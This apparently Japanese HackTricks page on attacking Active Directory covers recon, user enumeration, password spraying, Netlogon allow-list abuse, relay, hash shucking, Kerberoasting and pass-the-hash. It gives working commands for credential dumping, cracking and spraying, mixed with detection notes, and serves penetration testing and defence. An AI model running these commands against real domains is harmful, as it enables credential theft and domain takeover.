# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## 基本概要

**Active Directory** は基盤技術として機能し、**ネットワーク管理者**がネットワーク内の**ドメイン**、**ユーザー**、**オブジェクト**を効率的に作成・管理できるようにします。これは拡張性を考慮して設計されており、多数のユーザーを管理しやすい**グループ**や**サブグループ**に整理しながら、さまざまなレベルで**アクセス権**を制御できます。

**Active Directory** の構造は、**ドメイン**、**ツリー**、**フォレスト**という3つの主要なレイヤーで構成されます。**ドメイン**は、共通のデータベースを共有する**ユーザー**や**デバイス**などのオブジェクトの集合です。**ツリー**は、共通の構造によって結び付けられたドメインのグループであり、**フォレスト**は、**信頼関係**によって相互接続された複数のツリーの集合で、組織構造の最上位レイヤーを形成します。これらの各レベルで、特定の**アクセス**権や**通信権**を指定できます。

**Active Directory** の主要な概念は次のとおりです。

1. **Directory** – Active Directory オブジェクトに関するすべての情報を格納します。
2. **Object** – **ユーザー**、**グループ**、**共有フォルダー**など、ディレクトリ内のエンティティを指します。
3. **Domain** – ディレクトリオブジェクトのコンテナーとして機能します。1つの**フォレスト**内に複数のドメインを共存させることができ、それぞれが独自のオブジェクトコレクションを保持します。
4. **Tree** – 共通のルートドメインを共有するドメインのグループです。
5. **Forest** – Active Directory における組織構造の頂点であり、複数のツリーから構成され、それらの間に**信頼関係**があります。

**Active Directory Domain Services (AD DS)** は、ネットワーク内の集中管理と通信に不可欠な各種サービスを提供します。これらのサービスには次が含まれます。

1. **Domain Services** – データの保存を一元化し、**ユーザー**と**ドメイン**間のやり取りを管理します。**認証**や**検索**機能も含まれます。
2. **Certificate Services** – 安全な**デジタル証明書**の作成、配布、管理を統括します。
3. **Lightweight Directory Services** – **LDAP プロトコル**を通じて、ディレクトリ対応アプリケーションをサポートします。
4. **Directory Federation Services** – **シングルサインオン**機能を提供し、1回のセッションで複数の Web アプリケーションにわたってユーザーを認証できます。
5. **Rights Management** – 著作権で保護された素材の不正な配布や使用を規制し、その保護を支援します。
6. **DNS Service** – **ドメイン名**の解決に不可欠です。

より詳しい説明については、[**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory) を確認してください。

### **Kerberos Authentication**

**AD を攻撃する**方法を学ぶには、**Kerberos 認証プロセス**を本当によく**理解する**必要があります。\
[**まだ仕組みを知らない場合は、このページを読んでください。**](kerberos-authentication.md)

## Cheat Sheet

AD の列挙・exploit に使用できるコマンドをすばやく確認するには、[https://wadcoms.github.io/](https://wadcoms.github.io) を参照してください。

> [!WARNING]
> Kerberos 通信では通常、クライアントが正しい SPN のチケットを取得できるように、**完全修飾ドメイン名 (FQDN)** が必要です。IP アドレスでマシンにアクセスすると、一般的に Kerberos ではなく NTLM にフォールバックします。

## Recon Active Directory (No creds/sessions)

AD 環境にアクセスできても、資格情報やセッションを持っていない場合は、次のことができます。

- **ネットワークを Pentest する:**
- ネットワークをスキャンし、マシンと開いているポートを見つけ、**脆弱性を exploit**したり、そこから**資格情報を抽出**したりします（たとえば、[プリンターは非常に興味深いターゲットになる可能性があります](ad-information-in-printers.md)）。
- DNS を列挙すると、Web、プリンター、共有、VPN、メディアなど、ドメイン内の主要なサーバーに関する情報が得られる可能性があります。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- これを行う方法の詳細については、一般的な [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) を確認してください。
- **SMB サービスで null および Guest アクセスを確認する**（これは最新の Windows バージョンでは機能しません）。
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB サーバーを列挙する方法については、こちらに詳しいガイドがあります。


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Ldap を列挙する**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP を列挙する方法については、こちらに詳しいガイドがあります（**匿名アクセス**に特に注意してください）。


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **ネットワークを Poison する**
- [**Responder でサービスを impersonate して**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)資格情報を収集する
- [**relay attack を悪用して**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)ホストにアクセスする
- [**evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) で偽の UPnP サービスを **expose** し、資格情報を収集する
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 内部文書、ソーシャルメディア、ドメイン環境内のサービス（主に Web）、および公開されている情報から、ユーザー名や名前を抽出します。
- 会社の従業員の完全な名前が分かった場合は、さまざまな AD **ユーザー名規則 (**[**こちらを読んでください**](https://activedirectorypro.com/active-directory-user-naming-convention/)) を試すことができます。最も一般的な規則は、_NameSurname_、_Name.Surname_、_NamSur_（それぞれ3文字）、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、_ランダムな3文字とランダムな3つの数字_（abc123）です。
- ツール:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### ユーザー列挙

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) および [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) のページを確認してください。
- **Kerbrute enum**: **無効なユーザー名が要求されると**、サーバーは _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ **Kerberos エラー**コードで応答するため、ユーザー名が無効であると判断できます。**有効なユーザー名**の場合、AS-REP 応答で **TGT** が返されるか、ユーザーが pre-authentication を実行する必要があることを示す _KRB5KDC_ERR_PREAUTH_REQUIRED_ エラーが返されます。
- **MS-NRPC に対する No Authentication**: ドメインコントローラーの MS-NRPC (Netlogon) インターフェースに対し、auth-level = 1 (No authentication) を使用します。この手法では、MS-NRPC インターフェースに bind した後、`DsrGetDcNameEx2` 関数を呼び出し、資格情報なしでユーザーまたはコンピューターが存在するかを確認します。[NauthNRPC](https://github.com/sud0Ru/NauthNRPC) ツールは、この種類の列挙を実装しています。研究内容は[こちら](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>で確認できます。
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

ネットワーク上でこのようなサーバーを発見した場合、**user enumeration against it** も実行できます。たとえば、[**MailSniper**](https://github.com/dafthack/MailSniper) ツールを使用できます:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> ユーザー名のリストは[**このgithub repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)およびこちら（[**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)）で確認できます。
>
> ただし、これより前に実施しておくべきrecon stepで、**会社で働いている人物の名前**を入手しておくべきです。名前と姓があれば、[**namemash.py**](https://gist.github.com/superkojiman/11076951)スクリプトを使用して、利用可能性のあるユーザー名を生成できます。

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

DCに**Zerologon**のパッチを適用した後でも、明示的にallow-listへ登録されたアカウントは、**legacy/vulnerable Netlogon secure-channel behavior**にさらされる可能性があります。リスクのある設定は、GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`**、または対応するレジストリ値 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**です。

この値は**SDDL security descriptor**です（[Security Descriptors](security-descriptors.md)を参照）。DACL内で関連するACEを付与されたアカウントまたはグループは、攻撃対象にできます。たとえば、`O:BAG:BAD:(A;;RC;;;WD)`は実質的に**Everyone**をallow-listへ登録します。

実際のoperator workflow:

1. **SYSVOL/GPO**と**live DC registry**の両方を確認し、allow-listに登録されたprincipalを特定する。
2. SDDL内で見つかったSIDを実際のADユーザーまたはコンピューターに解決し、**DC machine accounts**、**trust accounts**、その他のprivileged machinesを優先する。
3. allow-listに登録されたアカウントとして、**MS-NRPC / Netlogon authentication**を繰り返し試行する。
4. 推測が成功した後、**Netlogon password-setting**を悪用して対象アカウントのパスワードをリセットする（公開PoCでは空文字列に設定されます）。<sup>[[9]](#references)[[10]](#references)</sup>

公開artifactに基づくquick triage / lab examples:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
メモ:

- **scanner** は、実効的な allow-list が **SYSVOL**、**registry**、またはその両方に存在する可能性があるため有用です。
- exploit path 自体が重要です。脆弱なアカウントが特定された後は、**Domain Admin privileges** を必要としないためです。
- `DC$` のような **Domain Controller machine account** を侵害することは特に危険です。このパスワードをリセットすると、より広範な **AD takeover** path を直接有効化できる可能性があります。
- **Brute-force feasibility** は mode に依存します。公開 artifact では、meet-in-the-middle approach、別の computer account が利用可能な場合の **24-bit** brute force、そしてより遅い **32-bit** variants が説明されています。

Detection / hardening notes:

- allow-list policy を監査し、一時的かつ明示的に必要な compatibility exceptions 以外はすべて削除します。
- DC の **System** events **5827/5828/5829/5830/5831** を監視し、脆弱な Netlogon connections が拒否された場合、検出された場合、または policy により明示的に許可された場合を把握します。
- `VulnerableChannelAllowList` 内の accounts は、legacy dependency が削除されるまで **high-risk** として扱います。

### 1つまたは複数の username を知っている場合

有効な username はすでにわかっているものの、password がない場合は、次を試します。

- [**ASREPRoast**](asreproast.md): user に _DONT_REQ_PREAUTH_ attribute が**ない場合**、その user の **AS_REP message** を **request** できます。この message には、user の password から導出された値で encrypted されたデータが含まれます。
- [**Password Spraying**](password-spraying.md): 発見した各 user に対して、最も**一般的な password**を試します。password の弱い user がいるかもしれません（password policy に注意してください）。
- **OWA servers** に対しても **spray** を実行し、users の mail servers への access を試せることに注意してください。


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

**network** の一部の protocols に対して **poisoning** を実行し、crack 可能な challenge **hashes** を**取得**できる場合があります。


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration により、authentication を強制できる candidate accounts、hosts、services が得られます。その context を使用して、実行可能な NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) と、AD environment への潜在的な path を特定します。

### NetExec workspace-driven recon & relay posture checks

- **`nxcdb` workspaces** を使用して、engagement ごとに AD recon state を保持します。`workspace create <name>` は `~/.nxc/workspaces/<name>` 配下に protocol ごとの SQLite DBs（smb/mssql/winrm/ldap/etc）を生成します。`proto smb|mssql|winrm` で view を切り替え、`creds` で収集した secrets を一覧表示します。完了後は sensitive data を手動で purge します: `rm -rf ~/.nxc/workspaces/<name>`。<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`** による quick subnet discovery では、**domain**、**OS build**、**SMB signing requirements**、**Null Auth** が表示されます。`(signing:False)` と表示される members は **relay-prone** ですが、DCs では通常 signing が required です。
- Targeting を容易にするため、NetExec output から **/etc/hosts の hostnames** を直接生成します:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- **SMB relay to the DC is blocked** by signing হলেও, **LDAP** の posture を引き続き確認する: `netexec ldap <dc>` は `(signing:None)` / weak channel binding を強調表示する。SMB signing が必須だが LDAP signing が無効な DC は、**SPN-less RBCD** などの abuse に利用できる、実行可能な **relay-to-LDAP** target のままである。

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UI に **masked admin passwords を HTML に埋め込んでいる**場合がある。ソースや devtools を確認すると cleartext（例: `<input value="<password>">`）が明らかになり、Basic-auth による scan/print repository への access が可能になる。
- 取得した print job には、user ごとの password を含む **plaintext onboarding docs** が含まれている場合がある。testing 時は pairings の対応関係を維持する:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

**null または guest user**で**他の PC や share にアクセス**できる場合、**ファイル**（SCF file など）を**配置**し、何らかの形でアクセスされた際に、**自分に対する NTLM authentication を t**rigger させることができます。これにより、crack 用の **NTLM challenge** を**盗む**ことができます:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** は、すでに所持しているすべての NT hash を、key material が NT hash から直接導出される、より低速な別形式の候補 password として扱います。Kerberos RC4 tickets、NetNTLM challenges、cached credentials で長い passphrase を brute-force する代わりに、NT hash を Hashcat の NT-candidate modes に入力し、plaintext を知ることなく password の再利用を検証させます。これは、数千件の現在および過去の NT hash を収集できる domain compromise 後に特に有効です。<sup>[[5]](#references)</sup>

以下の場合に shucking を使用します:

- DCSync、SAM/SECURITY dumps、または credential vaults から NT corpus を取得し、他の domains/forests での再利用をテストする必要がある場合。
- RC4-based Kerberos material（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM responses、または DCC/DCC2 blobs を capture した場合。
- crack できない長い passphrase の再利用をすばやく証明し、直ちに Pass-the-Hash へ pivot したい場合。

この technique は、key が NT hash ではない encryption types（Kerberos etype 17/18 AES など）には**機能しません**。domain が AES-only を強制している場合は、通常の password modes に戻す必要があります。

#### NT hash corpus の構築

- **DCSync/NTDS** – history を使用して、可能な限り多くの NT hash（過去の値を含む）を取得するには `secretsdump.py` を使用します:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries により candidate pool は大幅に広がります。Microsoft は account ごとに最大 24 個の過去の hash を保存できるためです。NTDS secrets を harvest するその他の方法については、以下を参照してください:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（または Mimikatz の `lsadump::sam /patch`）は、local SAM/SECURITY data と cached domain logons（DCC/DCC2）を抽出します。重複を排除し、これらの hash を同じ `nt_candidates.txt` list に追加します。
- **Track metadata** – 各 hash を生成した username/domain を記録しておきます（wordlist に hex しか含まれていない場合でも同様です）。Hashcat が winning candidate を出力した際、matching hashes により、どの principal が password を再利用しているかをすぐに特定できます。
- 同じ forest または trusted forest の candidates を優先します。これにより、shucking 時に overlap する可能性が最大になります。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs は**raw 32-hex NT hashes のままにする必要があります**。rule engines を無効にします（`-r` を指定せず、hybrid modes も使用しません）。mangling により candidate key material が破損するためです。
- これらの modes 自体が本質的に高速というわけではありません。しかし NTLM keyspace（M3 Max で約 30,000 MH/s）は Kerberos RC4（約 300 MH/s）より約 100 倍高速です。curated NT list をテストする方が、slow format で password space 全体を探索するよりはるかに低コストです。
- 常に**最新の Hashcat build**（`git clone https://github.com/hashcat/hashcat && make install`）を実行してください。modes 31500/31600/35300/35400 は最近追加されたためです。<sup>[[7]](#references)</sup>
- 現在、AS-REQ Pre-Auth 用の NT mode はありません。また、AES etypes（19600/19700）では plaintext password が必要です。これらの key は raw NT hash ではなく、UTF-16LE passwords から PBKDF2 を介して導出されるためです。

#### Example – Kerberoast RC4 (mode 35300)

1. low-privileged user で target SPN の RC4 TGS を capture します（詳細は Kerberoast page を参照）:

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. NT list を使用して ticket を shuck します:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat は各 NT candidate から RC4 key を導出し、`$krb5tgs$23$...` blob を検証します。match は、service account が既存の NT hash のいずれかを使用していることを確認します。

3. 直ちに PtH へ pivot します:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

必要であれば、後から `hashcat -m 1000 <matched_hash> wordlists/` で plaintext を復元できます。

#### Example – Cached credentials (mode 31600)

1. compromised workstation から cached logons を dump します:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 対象となる domain user の DCC2 line を `dcc2_highpriv.txt` に copy し、shuck します:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. match に成功すると、すでに list に存在する NT hash が得られ、cached user が password を再利用していることを証明できます。これを直接 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`）に使用するか、fast NTLM mode で brute-force して string を復元します。

まったく同じ workflow を NetNTLM challenge-responses（`-m 27000/27100`）および DCC（`-m 31500`）にも適用できます。match を特定したら、relay、SMB/WMI/WinRM PtH を開始するか、offline で masks/rules を使用して NT hash を再度 crack できます。



## credentials/session を使用した Active Directory の Enumerating

この phase では、**有効な domain account の credentials または session を compromise している必要があります**。有効な credentials または domain user としての shell がある場合、**前述の options も他の users を compromise するために引き続き使用できる**ことを覚えておいてください。

authenticated enumeration を開始する前に、**Kerberos double-hop problem** を理解してください。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

account の compromise は **domain を assessment するための大きな一歩**です。authenticated **Active Directory enumeration** が可能になるためです:

[**ASREPRoast**](asreproast.md) については、脆弱である可能性のあるすべての user を見つけられるようになります。また、[**Password Spraying**](password-spraying.md) については、**すべての usernames の list** を取得し、compromised account の password、empty passwords、新しく有望な passwords を試すことができます。

- [**CMD で basic recon を実行**](../basic-cmd-for-pentesters.md#domain-info)できます
- [**powershell を recon に使用**](../basic-powershell-for-pentesters/index.html)することもできます。こちらの方が stealthier です
- [**powerview を使用**](../basic-powershell-for-pentesters/powerview.md)して、より詳細な information を抽出することもできます
- active directory の recon 用のもう一つの優れた tool は [**BloodHound**](bloodhound.md) です。これは**あまり stealthy ではありません**（使用する collection methods によります）が、**それを気にしない**のであれば、ぜひ試してください。users が RDP できる場所や、他の groups への path などを見つけられます。
- **その他の automated AD enumeration tools:** [**AD Explorer**](bloodhound.md#ad-explorer)**、**[**ADRecon**](bloodhound.md#adrecon)**、**[**Group3r**](bloodhound.md#group3r)**、**[**PingCastle**](bloodhound.md#pingcastle)** です。**
- 興味深い information が含まれている可能性があるため、[**AD の DNS records**](ad-dns-records.md) を確認します。
- directory の enumerate に使用できる **GUI tool** は、**SysInternal** Suite の AdExplorer.exe です。
- **ldapsearch** を使用して LDAP database を検索し、_userPassword_、_unixUserPassword_、または _Description_ に credentials がないか探すこともできます。その他の methods については、PayloadsAllTheThings の [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) を参照してください。
- **Linux** を使用している場合は、[**pywerview**](https://github.com/the-useless-one/pywerview) を使用して domain を enumerate することもできます。
- 次のような automated tools も試せます:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **すべての domain users の Extracting**

Windows からすべての domain usernames を取得するのは非常に簡単です（`net user /domain`、`Get-DomainUser`、または `wmic useraccount get name,sid`）。Linux では、次を使用できます: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` または `enum4linux -a -u "user" -p "password" <DC IP>`

> この Enumeration section は小さく見えるかもしれませんが、全体の中で最も重要な部分です。links（特に cmd、powershell、powerview、BloodHound のもの）にアクセスし、domain の enumerate 方法を学び、慣れるまで practice してください。assessment 中、これは DA への path を見つける、または何もできないと判断するための重要な moment になります。

### Kerberoast

Kerberoasting では、user accounts に紐付いた services が使用する **TGS tickets** を取得し、user passwords に基づく encryption を**offline**で crack します。

詳細については、以下を参照してください:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

いくつかの credentials を取得したら、**machine** に access できるか確認できます。そのために、port scans に応じて、**CrackMapExec** を使用し、異なる protocols で複数の servers への接続を試行できます。

### Local Privilege Escalation

regular domain user として credentials または session を compromise しており、domain 内の**任意の machine に access できる**場合は、**locally privileges を escalate して credentials を collect する**path を探します。Local administrator privileges により、memory（LSASS）および local storage（SAM）から**他の users の hashes を dump**できる場合があります。

この book には、[**Windows の local privilege escalation**](../windows-local-privilege-escalation/index.html) と [**checklist**](../checklist-windows-privilege-escalation.md) に関する complete page があります。また、[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) の使用も忘れないでください。

### Current Session Tickets

現在の user の **tickets** に、予期しない resources への**access permission が付与されている**ケースは非常に**unlikely**ですが、次を確認できます:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

ドメインの認証情報またはユーザーセッションがある場合は、NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)を再検討します。認証済みの列挙および強制認証の手法により、未認証の偵察時には利用できなかったrelay経路を発見できる可能性があります。

### Looks for Creds in Computer Shares | SMB Shares

基本的な認証情報を入手したので、**AD内で共有されている****興味深いファイル**を**見つけられるか**確認します。手動でも実行できますが、非常に退屈で反復的な作業です（確認が必要なドキュメントを何百個も発見した場合は、なおさらです）。

[**使用できるtoolsについては、このlinkを参照してください。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

**他のPCまたはsharesにアクセス**できる場合、（SCF fileなどの）**filesを配置**できます。そのfileが何らかの方法でアクセスされると、**自身に対するNTLM authenticationをt**rigger**し**、**NTLM challenge**を**steal**してcrackできます:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

このvulnerabilityにより、認証済みの任意のuserが**domain controllerをcompromise**できました。


{{#ref}}
printnightmare.md
{{#endref}}

## Active Directoryでのprivilege escalation（privileged credentials/sessionあり）

**以下のtechniquesでは通常のdomain userだけでは不十分で、これらのattackを実行するには特別なprivileges/credentialsが必要です。**

### Hash extraction

[AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（relayを含む）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)、[locally escalating privileges](../windows-local-privilege-escalation/index.html)を使用して、**local admin** accountの**compromise**に成功していることを願います。\
続いて、memory内およびlocalにあるすべてのhashをdumpします。\
[**hashを取得するさまざまな方法については、このpageを参照してください。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**userのhashを入手したら**、それを使用してuserに**impersonate**できます。\
その**hashを使用して****NTLM authenticationを実行**する**tool**を使う必要があります。あるいは、新しい**sessionlogon**を作成し、その**hash**を**LSASS**内に**inject**することもできます。そうすると、**NTLM authenticationが実行されるときは常に、そのhashが使用されます。** 最後の方法はmimikatzが実行するものです。\
[**詳細については、このpageを参照してください。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

このattackは、一般的なNTLM protocol over Pass The Hashの代わりに、**userのNTLM hashを使用してKerberos ticketsを要求する**ことを目的としています。そのため、**NTLM protocolが無効化され、authentication protocolとしてKerberosのみが許可されている**networkでは、特に**有用**です。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT) attack** methodでは、attackersはpasswordやhash valuesではなく、**userのauthentication ticketをsteal**します。このstealしたticketを使用して**userにimpersonate**し、network内のresourcesやservicesへの不正なaccessを取得します。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

**local administrato**rの**hash**または**password**がある場合は、それを使って他の**PC**に**locally login**できるか試します。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> これはかなり **noisy** であり、**LAPS** によって **mitigate** できます。

### MSSQL Abuse & Trusted Links

ユーザーが **MSSQL instances への access** 権限を持っている場合、MSSQL host 上で **commands を execute** したり（SA として実行されている場合）、NetNTLM **hash を steal** したり、さらには **relay attack** を実行したりできる可能性があります。\
ある MSSQL instance が別の instance から database link 経由で信頼されている場合、linked database に対する権限を持つユーザーは、**trust relationship を利用して他の instance 上で queries を execute** できる可能性があります。これらの trust は chain でき、最終的にユーザーが commands を execute できる misconfigured database に到達する可能性があります。\
**データベース間の links は forest trusts をまたいでも機能します。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party の inventory および deployment suites は、credentials と code execution につながる強力な経路を公開していることがよくあります。以下を参照してください:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 属性を持つ Computer object を発見し、その computer に対する domain privileges を持っている場合、その computer に login するすべての users の TGTs を memory から dump できます。\
したがって、**Domain Admin がその computer に login した場合**、その TGT を dump し、[Pass the Ticket](pass-the-ticket.md) を使用して impersonate できます。\
constrained delegation により、**Print Server** を **automatically compromise** することさえ可能です（できれば DC であることが望まれます）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

user または computer が "Constrained Delegation" に許可されている場合、**computer 上の一部の services に access するため、任意の user を impersonate** できます。\
その後、この user/computer の **hash を compromise** できれば、**任意の user**（domain admins を含む）を **impersonate** して、一部の services に access できます。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

remote computer の Active Directory object に対する **WRITE** privilege を持つと、**elevated privileges** での code execution が可能になります:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

compromised user は、いくつかの domain objects に対して **interesting privileges** を持っている可能性があり、それによって laterally **move** したり、privileges を **escalate** したりできます。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

domain 内で **Spool service listening** を発見すると、それを **abuse** して **new credentials を acquire** し、**privileges を escalate** できる可能性があります。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

**other users** が **compromised** machine に **access** する場合、memory から credentials を **gather** し、さらにその processes に beacons を **inject** して users を impersonate できる可能性があります。\
通常、users は RDP 経由で system に access するため、third-party RDP sessions に対して couple of attacks を実行する方法を以下に示します:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

